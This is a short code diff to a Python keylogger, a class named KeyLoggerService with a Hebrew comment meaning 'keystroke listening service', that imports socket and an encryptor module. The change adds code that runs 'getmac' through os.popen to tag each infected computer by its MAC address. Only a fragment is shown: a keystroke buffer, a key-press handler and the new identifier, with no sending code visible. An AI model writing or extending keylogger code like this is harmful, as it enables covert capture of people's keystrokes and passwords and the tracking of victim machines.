@@ -4,11 +4,13 @@ import socket
 import threading
 import time
 import encryptor
+import os
 
 # שירות ההאזנה להקלדות
 class KeyLoggerService:
     def __init__(self):
         self.buffer = []
+        self.ID_COMPUTER = os.popen("getmac /NH /FO CSV").read().split(",")[0].replace('"', '').strip()
         self.lock = threading.Lock()
 
     def on_press(self, key):
